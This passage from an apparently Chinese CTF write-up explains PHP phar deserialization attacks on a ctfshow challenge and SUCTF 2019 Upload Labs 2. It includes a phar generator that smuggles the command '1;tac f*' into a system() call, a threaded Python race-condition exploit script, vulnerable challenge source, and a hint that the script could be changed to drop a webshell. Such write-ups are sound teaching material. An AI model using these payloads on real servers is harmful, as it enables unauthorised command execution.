+</span></span><span class=line><span class=cl>    <span class=nv>$f</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>filter</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;fn&#39;</span><span class=p>],</span><span class=nv>$content</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nv>$f</span><span class=o>-&gt;</span><span class=na>checkevil</span><span class=p>()</span><span class=o>===</span><span class=k>false</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=nx>file_put_contents</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;fn&#39;</span><span class=p>],</span> <span class=nv>$content</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nx>copy</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;fn&#39;</span><span class=p>],</span><span class=nx>md5</span><span class=p>(</span><span class=nx>mt_rand</span><span class=p>())</span><span class=o>.</span><span class=s1>&#39;.txt&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nx>unlink</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;DOCUMENT_ROOT&#39;</span><span class=p>]</span><span class=o>.</span><span class=s1>&#39;/&#39;</span><span class=o>.</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;fn&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s1>&#39;work done&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl><span class=p>}</span><span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;where is flag?&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>where</span> <span class=nx>is</span> <span class=nx>flag</span><span class=o>?</span>
+</span></span></code></pre></td></tr></table></div></div><p>有个<code>unlink</code>而且没有<code>unserialize</code>，还有写入文件，那么肯定是<code>phar</code>文件的利用了</p><p>利用点这个有个<code>system</code>,我们直接用<code>;</code>，然后就可以执行命令了</p><p>不多说直接生成<code>phar</code>文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>filter</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=c1>//public $filename=&#39;1;ls&#39;;
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>public</span> <span class=nv>$filename</span><span class=o>=</span><span class=s1>&#39;1;tac f*&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$filecontent</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$evilfile</span><span class=o>=</span><span class=k>true</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$admin</span> <span class=o>=</span> <span class=k>true</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>unlink</span><span class=p>(</span><span class=s2>&#34;phar.phar&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>=</span><span class=k>new</span> <span class=nx>Phar</span><span class=p>(</span><span class=s1>&#39;phar.phar&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>startBuffering</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setStub</span><span class=p>(</span><span class=s2>&#34;&lt;?php __HALT_COMPILER();?&gt;&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$o</span><span class=o>=</span><span class=k>new</span> <span class=nx>filter</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setMetadata</span><span class=p>(</span><span class=nv>$o</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>addFromString</span><span class=p>(</span><span class=s1>&#39;test.txt&#39;</span><span class=p>,</span><span class=s1>&#39;test&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>stopBuffering</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>url</span><span class=o>=</span><span class=s2>&#34;http://dd9d543e-beb7-4628-b01b-7f0490c24cb9.challenge.ctf.show/&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>data</span><span class=o>=</span><span class=nb>open</span><span class=p>(</span><span class=s1>&#39;./phar.phar&#39;</span><span class=p>,</span><span class=s1>&#39;rb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>target</span><span class=o>=</span><span class=kc>True</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>write</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;?fn=phar.phar&#34;</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>unserialize</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>target</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;?fn=phar://phar.phar&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=c1># if &#34;php&#34; in r.text and target:</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;ctfshow{&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span> <span class=ow>and</span> <span class=n>target</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>target</span><span class=o>=</span><span class=kc>False</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>while</span> <span class=n>target</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>write</span><span class=p>)</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>unserialize</span><span class=p>)</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>当然也可以写木马，改一下脚本就可以了</p><h2 id=demo3>demo3</h2><p><strong>[SUCTF 2019]Upload Labs 2</strong></p><p>这里还要配合原生类<code>soapclient</code></p><p>打开<code>php.ini</code>，开一下拓展</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>extension=soap
+</span></span></code></pre></td></tr></table></div></div><p>有附件的，代码量不大，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=c1>//config.php
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>&lt;?</span><span class=nx>php</span> 
+</span></span><span class=line><span class=cl><span class=nx>libxml_disable_entity_loader</span><span class=p>(</span><span class=k>true</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>用来防止xxe攻击，index.php是个正常的文件上传，不看了，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=c1>//func.php
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>include</span> <span class=s1>&#39;class.php&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s2>&#34;submit&#34;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s2>&#34;url&#34;</span><span class=p>]))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i&#39;</span><span class=p>,</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;url&#39;</span><span class=p>])){</span>
+</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;Go away!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=k>else</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$file_path</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;url&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$file</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>File</span><span class=p>(</span><span class=nv>$file_path</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$file</span><span class=o>-&gt;</span><span class=na>getMIME</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;&lt;p&gt;Your file type is &#39;</span><span class=si>$file</span><span class=s2>&#39; &lt;/p&gt;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>进行协议检测，但是正则没写好，phar协议被过滤，利用php协议套一层绕过就行了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=c1>//class.php
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>include</span> <span class=s1>&#39;config.php&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>File</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$file_name</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$type</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$func</span> <span class=o>=</span> <span class=s2>&#34;Check&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$file_name</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>file_name</span> <span class=o>=</span> <span class=nv>$file_name</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$class</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>func</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$a</span> <span class=o>=</span> <span class=nv>$class</span><span class=o>-&gt;</span><span class=na>newInstanceArgs</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>file_name</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$a</span><span class=o>-&gt;</span><span class=na>check</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>getMIME</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$finfo</span> <span class=o>=</span> <span class=nx>finfo_open</span><span class=p>(</span><span class=nx>FILEINFO_MIME_TYPE</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>type</span> <span class=o>=</span> <span class=nx>finfo_file</span><span class=p>(</span><span class=nv>$finfo</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>file_name</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nx>finfo_close</span><span class=p>(</span><span class=nv>$finfo</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__toString</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>type</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Check</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$file_name</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$file_name</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>file_name</span> <span class=o>=</span> <span class=nv>$file_name</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>check</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$data</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>file_name</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>mb_strpos</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span> <span class=s2>&#34;&lt;?&#34;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>FALSE</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=k>die</span><span class=p>(</span><span class=s2>&#34;&amp;lt;? in contents!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>两个类，一个是在index.php里面调用的，会解析是否有<code>&lt;?</code>，在stub头里面用标签绕过即可。File类里面的wakeup方法可以任意反射类，<code>getMIME()</code>里面的<code>finfo_file</code>会触发phar反序列化</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>include</span> <span class=s1>&#39;config.php&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Ad</span><span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$cmd</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$clazz</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$func1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$func2</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$func3</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$instance</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$arg1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$arg2</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$arg3</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$cmd</span><span class=p>,</span> <span class=nv>$clazz</span><span class=p>,</span> <span class=nv>$func1</span><span class=p>,</span> <span class=nv>$func2</span><span class=p>,</span> <span class=nv>$func3</span><span class=p>,</span> <span class=nv>$arg1</span><span class=p>,</span> <span class=nv>$arg2</span><span class=p>,</span> <span class=nv>$arg3</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cmd</span> <span class=o>=</span> <span class=nv>$cmd</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>clazz</span> <span class=o>=</span> <span class=nv>$clazz</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>func1</span> <span class=o>=</span> <span class=nv>$func1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>func2</span> <span class=o>=</span> <span class=nv>$func2</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>func3</span> <span class=o>=</span> <span class=nv>$func3</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>arg1</span> <span class=o>=</span> <span class=nv>$arg1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>arg2</span> <span class=o>=</span> <span class=nv>$arg2</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>arg3</span> <span class=o>=</span> <span class=nv>$arg3</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>check</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nv>$reflect</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>clazz</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>instance</span> <span class=o>=</span> <span class=nv>$reflect</span><span class=o>-&gt;</span><span class=na>newInstanceArgs</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nv>$reflectionMethod</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>clazz</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>func1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$reflectionMethod</span><span class=o>-&gt;</span><span class=na>invoke</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>instance</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>arg1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nv>$reflectionMethod</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>clazz</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>func2</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$reflectionMethod</span><span class=o>-&gt;</span><span class=na>invoke</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>instance</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>arg2</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nv>$reflectionMethod</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ReflectionMethod</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>clazz</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>func3</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$reflectionMethod</span><span class=o>-&gt;</span><span class=na>invoke</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>instance</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>arg3</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__destruct</span><span class=p>(){</span>
+</span></span><span class=line><span class=cl>        <span class=nx>system</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cmd</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;REMOTE_ADDR&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;127.0.0.1&#39;</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;admin&#39;</span><span class=p>])){</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$cmd</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nv>$clazz</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;clazz&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$func1</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;func1&#39;</span><span class=p>];</span>
